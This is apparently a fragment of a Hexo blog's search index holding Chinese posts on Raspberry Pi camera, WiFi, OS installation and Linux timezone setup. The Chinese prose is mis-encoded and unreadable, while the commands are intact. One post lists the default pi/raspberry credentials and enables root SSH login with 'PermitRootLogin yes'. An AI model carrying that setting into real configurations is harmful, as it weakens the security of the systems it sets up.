        <content type="html"><![CDATA[<h3 id="æ ‘è“æ´¾æ‘„åƒå¤´æŒ‚è½½"><a href="#æ ‘è“æ´¾æ‘„åƒå¤´æŒ‚è½½" class="headerlink" title="æ ‘è“æ´¾æ‘„åƒå¤´æŒ‚è½½"></a>æ ‘è“æ´¾æ‘„åƒå¤´æŒ‚è½½</h3><h4 id="é—®é¢˜æè¿°"><a href="#é—®é¢˜æè¿°" class="headerlink" title="é—®é¢˜æè¿°"></a>é—®é¢˜æè¿°</h4><p>ä½¿ç”¨raspistillå‘½ä»¤èƒ½æ‹ç…§ï¼Œä½†æ˜¯è°ƒç”¨opencvæ‰“å¼€æ‘„åƒå¤´æ–¹æ³•å´å¤±è´¥ã€‚æ‰¾ä¸åˆ°&#x2F;dev&#x2F;video0è®¾å¤‡ã€‚</p><h4 id="å¤„ç†åŠæ³•"><a href="#å¤„ç†åŠæ³•" class="headerlink" title="å¤„ç†åŠæ³•"></a>å¤„ç†åŠæ³•</h4><p><code>sudo modprobe bcm2835-v4l2 gst_v4l2src_is_broken=1</code></p><p>è¦æƒ³æ°¸ä¹…ç”Ÿæ•ˆï¼Œéœ€è¦ä¿®æ”¹<code>/etc/modules-load.d/modules.conf </code>ï¼Œåœ¨ä¸‹é¢è¿½åŠ <br><code>bcm2835-v4l2</code></p><p>å‚è€ƒï¼š<a href="http://blog.csdn.net/machh/article/details/51385130">ã€1ã€‘</a> <a href="http://stackoverflow.com/questions/25941171/how-to-get-gstreamer1-0-working-with-v4l2-raspicam-driver">ã€2ã€‘</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> RaspberryPi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ ‘è“æ´¾è®¾ç½®WIFI</title>
      <link href="/post/raspberry-pi-wifi.html"/>
      <url>/post/raspberry-pi-wifi.html</url>
      
        <content type="html"><![CDATA[<h3 id="å¯åŠ¨è®¾ç½®WIFI"><a href="#å¯åŠ¨è®¾ç½®WIFI" class="headerlink" title="å¯åŠ¨è®¾ç½®WIFI"></a>å¯åŠ¨è®¾ç½®WIFI</h3><p>æ–°å»º <code>wpa_supplicant.conf</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev</span><br><span class="line">network=&#123;</span><br><span class="line">    ssid=&quot;è·¯ç”±åç§°&quot;</span><br><span class="line">    psk=&quot;å¯†ç &quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡å¯ç”µè„‘</p><h3 id="æ‰«æWiFi"><a href="#æ‰«æWiFi" class="headerlink" title="æ‰«æWiFi"></a>æ‰«æWiFi</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo iwlist wlan0 scan | grep ESSID</span><br></pre></td></tr></table></figure><h3 id="è®¾ç½®é™æ€IP"><a href="#è®¾ç½®é™æ€IP" class="headerlink" title="è®¾ç½®é™æ€IP"></a>è®¾ç½®é™æ€IP</h3><p>ç¼–è¾‘&#x2F;etc&#x2F;network&#x2F;interfaces<br><code>sudo vi /etc/network/interfaces</code></p><p>æ‰¾åˆ°<code>allow-hotplug wlan0</code>ä¸€æ <br>ä¿®æ”¹ä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iface wlan0 inet static</span><br><span class="line">    address 192.168.0.118</span><br><span class="line">    gateway 192.168.0.1</span><br><span class="line">    netmask 255.255.255.0 </span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼Œå¦‚æœ<code>/etc/network/interfaces</code>æœ‰å¦‚ä¸‹æç¤ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Please note that this file is written to be used with dhcpcd</span><br><span class="line"># For static IP, consult /etc/dhcpcd.conf and &#x27;man dhcpcd.conf&#x27;</span><br></pre></td></tr></table></figure><p>éœ€è¦åœ¨<code>/etc/dhcpcd.conf</code>é…ç½®é™æ€IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">interface eth0</span><br><span class="line">static ip_address=192.168.1.4/24 # /24è¡¨ç¤ºæ©ç ä¸º 255.255.255.0</span><br><span class="line">static routers=192.168.1.1</span><br><span class="line">static domain_name_servers=114.114.114.114 114.114.115.115</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> RaspberryPi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ ‘è“æ´¾å®‰è£…æ“ä½œç³»ç»Ÿ</title>
      <link href="/post/raspberry-pi-os.html"/>
      <url>/post/raspberry-pi-os.html</url>
      
        <content type="html"><![CDATA[<h2 id="æ ‘è“æ´¾å®‰è£…æ“ä½œç³»ç»Ÿ"><a href="#æ ‘è“æ´¾å®‰è£…æ“ä½œç³»ç»Ÿ" class="headerlink" title="æ ‘è“æ´¾å®‰è£…æ“ä½œç³»ç»Ÿ"></a>æ ‘è“æ´¾å®‰è£…æ“ä½œç³»ç»Ÿ</h2><h3 id="å®‰è£…æ­¥éª¤"><a href="#å®‰è£…æ­¥éª¤" class="headerlink" title="å®‰è£…æ­¥éª¤"></a>å®‰è£…æ­¥éª¤</h3><ol><li><p><a href="https://www.raspberrypi.org/downloads/raspbian/">ä¸‹è½½</a>ç³»ç»Ÿé•œåƒ</p></li><li><p>å¦‚æœæ˜¯<code>.zip</code>æ–‡ä»¶è§£å‹é•œåƒ</p></li><li><p>æ ¼å¼åŒ–SDå¡</p><p> å¿…é¡»æ˜¯<code>FAT32</code>æ ¼å¼</p></li><li><p><code>diskutil list</code> æ‰¾åˆ°SDå¡</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/dev/disk0 (internal):</span><br><span class="line">#:                       TYPE NAME                    SIZE       IDENTIFIER</span><br><span class="line">0:      GUID_partition_scheme                         500.3 GB   disk0</span><br><span class="line">1:                        EFI EFI                     314.6 MB   disk0s1</span><br><span class="line">2:                 Apple_APFS Container disk1         500.0 GB   disk0s2</span><br><span class="line"></span><br><span class="line">/dev/disk1 (synthesized):</span><br><span class="line">#:                       TYPE NAME                    SIZE       IDENTIFIER</span><br><span class="line">0:      APFS Container Scheme -                      +500.0 GB   disk1</span><br><span class="line">                            Physical Store disk0s2</span><br><span class="line">1:                APFS Volume Macintosh HD            171.9 GB   disk1s1</span><br><span class="line">2:                APFS Volume Preboot                 39.8 MB    disk1s2</span><br><span class="line">3:                APFS Volume Recovery                519.0 MB   disk1s3</span><br><span class="line">4:                APFS Volume VM                      4.3 GB     disk1s4</span><br><span class="line"></span><br><span class="line">/dev/disk2 (external, physical):</span><br><span class="line">#:                       TYPE NAME                    SIZE       IDENTIFIER</span><br><span class="line">0:     FDisk_partition_scheme                        *32.0 GB    disk2</span><br><span class="line">1:             Windows_FAT_32 boot                    66.1 MB    disk2s1</span><br><span class="line">2:                      Linux                         31.9 GB    disk2s2</span><br></pre></td></tr></table></figure></li><li><p>å¸è½½è®¾å¤‡</p><blockquote><p>æ­¤å¤„çš„<code>/dev/disk2</code>ä¸ºä¸Šæ¡å‘½ä»¤æŸ¥åˆ°çš„SDå¡</p></blockquote> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diskutil unmountDisk /dev/disk2</span><br></pre></td></tr></table></figure></li><li><p>å°†é•œåƒå†™å…¥SDå¡</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dd bs=1m if=2016-05-27-raspbian-jessie.img of=/dev/rdisk2</span><br></pre></td></tr></table></figure></li></ol><h3 id="ç™»å½•ç³»ç»Ÿ"><a href="#ç™»å½•ç³»ç»Ÿ" class="headerlink" title="ç™»å½•ç³»ç»Ÿ"></a>ç™»å½•ç³»ç»Ÿ</h3><ol><li><p>ä½¿ç”¨ç½‘çº¿é“¾æ¥åˆ°è·¯ç”±å™¨</p></li><li><p>ç™»å½•è·¯ç”±å™¨ç®¡ç†ç•Œé¢æŸ¥çœ‹æ ‘è“æ´¾IP</p><p> æˆ–è€…ä½¿ç”¨nmapæ‰«æç«¯å£ </p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p22 10.0.1.3/24</span><br></pre></td></tr></table></figure><blockquote><p>10.0.1.3 ä¸ºä½ æœ¬æœºIP</p></blockquote></li><li><p>SSHç™»å½•åˆ°æ ‘è“æ´¾</p><blockquote><p>é»˜è®¤ç”¨æˆ·åä¸º<code>pi</code>ï¼Œå¯†ç ä¸º<code>raspberry</code>ã€‚<br>æ³¨æ„ï¼šæ–°ç‰ˆ<code>raspberrypi</code>æ“ä½œç³»ç»Ÿ<code>SSH</code>æœåŠ¡å¹¶æ²¡æœ‰å¼€æœºå¯åŠ¨ï¼ï¼ï¼æ­¤æ—¶éœ€è¦åœ¨åœ¨ç£ç›˜ç›®å½•æ–°å»ºä¸€ä¸ªåä¸º<code>ssh</code>çš„æ–‡ä»¶ã€‚</p></blockquote> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh pi@host</span><br></pre></td></tr></table></figure> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh pi@raspberrypi.local</span><br></pre></td></tr></table></figure></li><li><p>ä¿®æ”¹é»˜è®¤å¯†ç </p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd pi</span><br></pre></td></tr></table></figure></li><li><p>å¯ç”¨rootç”¨æˆ·</p><ol><li><p>è®¾ç½®rootç”¨æˆ·å¯†ç </p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure></li><li><p>è§£é”rootç”¨æˆ·</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd --unlock root</span><br></pre></td></tr></table></figure></li><li><p>å…è®¸root SSHç™»å½•</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><p> æ‰¾åˆ°<code>PermitRootLogin</code>ä¸€è¡Œä¿®æ”¹ä¸º<code>PermitRootLogin yes</code></p></li></ol></li></ol><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://www.raspberrypi.org/documentation/installation/installing-images/mac.md">INSTALLING OPERATING SYSTEM IMAGES ON MAC OS</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> RaspberryPi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linuxæ—¶åŒº</title>
      <link href="/post/linux-timezone.html"/>
      <url>/post/linux-timezone.html</url>
      
        <content type="html"><![CDATA[<h2 id="Linuxä¿®æ”¹æ—¶åŒº"><a href="#Linuxä¿®æ”¹æ—¶åŒº" class="headerlink" title="Linuxä¿®æ”¹æ—¶åŒº"></a>Linuxä¿®æ”¹æ—¶åŒº</h2><blockquote><p>date -R æŸ¥çœ‹å½“å‰ç³»ç»Ÿæ—¶åŒº</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/timezone</span><br></pre></td></tr></table></figure><p><code>tzselect</code> é€‰æ‹©æ—¶åŒºï¼Œé€‰ç€å®Œæˆä¸ä¼šç”Ÿæ•ˆã€‚éœ€è¦åœ¨<code>.profile</code>ä¸­åŠ å…¥<code>TZ=&#39;Asia/Shanghai&#39;; export TZ</code>åç”Ÿæ•ˆã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tzselect</span></span><br><span class="line">Please identify a location so that time zone rules can be set correctly.</span><br><span class="line">Please select a continent, ocean, &quot;coord&quot;, or &quot;TZ&quot;.</span><br><span class="line"> 1) Africa</span><br><span class="line"> 2) Americas</span><br><span class="line"> 3) Antarctica</span><br><span class="line"> 4) Arctic Ocean</span><br><span class="line"> 5) Asia</span><br><span class="line"> 6) Atlantic Ocean</span><br><span class="line"> 7) Australia</span><br><span class="line"> 8) Europe</span><br><span class="line"> 9) Indian Ocean</span><br><span class="line">10) Pacific Ocean</span><br><span class="line">11) coord - I want to use geographical coordinates.</span><br><span class="line">12) TZ - I want to specify the time zone using the Posix TZ format.</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">5</span></span><br><span class="line">Please select a country whose clocks agree with yours.</span><br><span class="line"> 1) Afghanistan       18) Israel            35) Palestine</span><br><span class="line"> 2) Armenia           19) Japan             36) Philippines</span><br><span class="line"> 3) Azerbaijan        20) Jordan            37) Qatar</span><br><span class="line"> 4) Bahrain           21) Kazakhstan        38) Russia</span><br><span class="line"> 5) Bangladesh        22) Korea (North)     39) Saudi Arabia</span><br><span class="line"> 6) Bhutan            23) Korea (South)     40) Singapore</span><br><span class="line"> 7) Brunei            24) Kuwait            41) Sri Lanka</span><br><span class="line"> 8) Cambodia          25) Kyrgyzstan        42) Syria</span><br><span class="line"> 9) China             26) Laos              43) Taiwan</span><br><span class="line">10) Cyprus            27) Lebanon           44) Tajikistan</span><br><span class="line">11) East Timor        28) Macau             45) Thailand</span><br><span class="line">12) Georgia           29) Malaysia          46) Turkmenistan</span><br><span class="line">13) Hong Kong         30) Mongolia          47) United Arab Emirates</span><br><span class="line">14) India             31) Myanmar (Burma)   48) Uzbekistan</span><br><span class="line">15) Indonesia         32) Nepal             49) Vietnam</span><br><span class="line">16) Iran              33) Oman              50) Yemen</span><br><span class="line">17) Iraq              34) Pakistan</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">9</span></span><br><span class="line">Please select one of the following time zone regions.</span><br><span class="line">1) Beijing Time</span><br><span class="line">2) Xinjiang Time</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">1</span></span><br><span class="line">The following information has been given:</span><br><span class="line">    China</span><br><span class="line">    Beijing Time</span><br><span class="line">Therefore TZ=&#x27;Asia/Shanghai&#x27; will be used.</span><br><span class="line">Local time is now:  Wed Jul 13 18:42:06 CST 2016.</span><br><span class="line">Universal Time is now:  Wed Jul 13 10:42:06 UTC 2016.</span><br><span class="line">Is the above information OK?</span><br><span class="line">1) Yes</span><br><span class="line">2) No</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">1</span></span><br><span class="line">You can make this change permanent for yourself by appending the line</span><br><span class="line">    TZ=&#x27;Asia/Shanghai&#x27;; export TZ</span><br><span class="line">to the file &#x27;.profile&#x27; in your home directory; then log out and log in again.</span><br><span class="line">Here is that TZ value again, this time on standard output so that you</span><br><span class="line">can use the /usr/bin/tzselect command in shell scripts:</span><br><span class="line">Asia/Shanghai</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;TZ=&#x27;Asia/Shanghai&#x27;; export TZ&quot;</span> &gt;&gt; ~/.profile</span><br><span class="line"><span class="built_in">source</span> ~/.profile</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="http://codingstandards.iteye.com/blog/834280">æˆ‘ä½¿ç”¨è¿‡çš„Linuxå‘½ä»¤ä¹‹tzselect - é€‰æ‹©æ—¶åŒº</a> </li><li><a href="http://www.jb51.net/LINUXjishu/158824.html">linuxä¿®æ”¹ç³»ç»Ÿæ—¶é—´å’ŒlinuxæŸ¥çœ‹æ—¶åŒºã€ä¿®æ”¹æ—¶åŒºçš„æ–¹æ³•</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> timezone </tag>
            
            <tag> tzselect </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
